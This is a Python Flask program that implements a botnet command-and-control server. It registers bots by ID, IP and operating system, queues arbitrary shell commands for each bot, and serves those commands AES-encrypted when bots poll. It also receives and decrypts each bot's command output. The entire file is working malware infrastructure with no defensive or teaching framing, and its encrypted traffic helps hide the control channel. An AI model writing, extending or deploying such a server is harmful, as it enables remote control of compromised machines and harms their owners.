from flask import Flask, request, jsonify
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from base64 import b64encode, b64decode
import time
import os

app = Flask(__name__)

# AES Encryption setup
KEY = os.urandom(16)  # Generate a random AES key
BLOCK_SIZE = 16

def encrypt_data(data):
    cipher = AES.new(KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode(), BLOCK_SIZE))
    iv = b64encode(cipher.iv).decode('utf-8')
    ct = b64encode(ct_bytes).decode('utf-8')
    return iv, ct

def decrypt_data(iv, ct):
    iv = b64decode(iv)
    ct = b64decode(ct)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), BLOCK_SIZE).decode('utf-8')
    return pt

bots = {}  # bot_id: {'last_seen': timestamp, 'ip': ip, 'os': os}
commands = {}  # bot_id: 'command to run'

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    ip = request.remote_addr
    bots[bot_id] = {'last_seen': time.time(), 'ip': ip, 'os': data.get('os')}
    return jsonify({'status': 'registered'})

@app.route('/get', methods=['GET'])
def get_command():
    bot_id = request.args.get('id')
    bots[bot_id]['last_seen'] = time.time()
    cmd = commands.get(bot_id, '')
    iv, encrypted_cmd = encrypt_data(cmd)
    return jsonify({'cmd': encrypted_cmd, 'iv': iv})

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    bot_id = data.get('id')
    iv = data.get('iv')
    encrypted_output = data.get('output')
    output = decrypt_data(iv, encrypted_output)
    print(f"[+] Report from {bot_id}:")
    print(output)
    return jsonify({'status': 'received'})

@app.route('/send', methods=['POST'])
def send():
    data = request.json
    bot_id = data.get('id')
    cmd = data.get('cmd')
    commands[bot_id] = cmd
    return jsonify({'status': 'command queued'})

@app.route('/list', methods=['GET'])
def list_bots():
    return jsonify(bots)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
